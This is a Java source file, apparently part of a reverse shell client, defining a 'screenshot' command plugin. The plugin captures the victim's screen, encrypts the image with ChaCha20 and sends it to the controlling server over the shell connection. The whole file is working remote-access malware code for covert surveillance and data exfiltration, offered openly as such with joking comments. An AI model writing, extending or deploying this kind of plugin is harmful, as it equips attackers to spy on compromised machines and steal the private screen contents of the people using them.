package obs1d1anc1ph3r.reverseshell.client.plugins;

import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import obs1d1anc1ph3r.reverseshell.client.responsehandling.ResponseSender;
import obs1d1anc1ph3r.reverseshell.client.encryption.ChaCha20;
import obs1d1anc1ph3r.reverseshell.client.utils.ScreenShot;
import obs1d1anc1ph3r.reverseshell.client.utils.StreamHandler;

public class ScreenshotCommand implements CommandPlugin {

	private final ScreenShot screenShot = new ScreenShot();
	private final StreamHandler streamHandler;
	private ResponseSender responseSender;
	private static final Logger logger = Logger.getLogger(ScreenshotCommand.class.getName());

	public ScreenshotCommand(StreamHandler streamHandler) {
		this.streamHandler = streamHandler;
	}

	@Override
	public String getCommandName() {
		return "screenshot";
	}

	@Override
	public String execute(String[] args) {
		byte[] imageBytes = screenShot.imageBytes();
		if (imageBytes != null && imageBytes.length > 0) {
			sendScreenShot(imageBytes);
			return ""; //I didn't want it to really say anything
		} else {
			try {
				responseSender.sendEncryptedResponse("Error: Failed to capture screenshot.");
			} catch (Exception ex) {
				logger.log(Level.SEVERE, "Failed to send error response", ex);
			}
			return "Error: Failed to capture screenshot.";
		}
	}

	private void sendScreenShot(byte[] imageBytes) {
		try {

			if (imageBytes.length <= 0) {
				logger.warning("Empty screenshot data, nothing sent.");
				responseSender.sendEncryptedResponse("Error: Failed to capture screenshot.");
			}

			byte[] nonce = ChaCha20.generateNonce(); //Stupid hat -- You're a stupid hat
			byte[] encryptedData = ChaCha20.encrypt(streamHandler.getEncryptionKey(), nonce, imageBytes); //Encrypt the stuff
			
			responseSender.sendEncryptedResponse("screenshot"); //Server needs to know what's up
			streamHandler.getDataOut().writeInt(nonce.length + encryptedData.length); //Server also needs to know the lengths
			streamHandler.getDataOut().write(nonce); //Server needs to know the stupid hat
			streamHandler.getDataOut().write(encryptedData); //Send the encrypted data
			streamHandler.getDataOut().flush(); //It's gross if you don't

		} catch (IOException ex) {
			logger.log(Level.SEVERE, "Failed to send screenshot", ex);
		} catch (Exception ex) {
			logger.log(Level.SEVERE, "Unexpected error", ex);
		}
	}

	public void setResponseSender(ResponseSender responseSender) {
		this.responseSender = responseSender;
	}
}
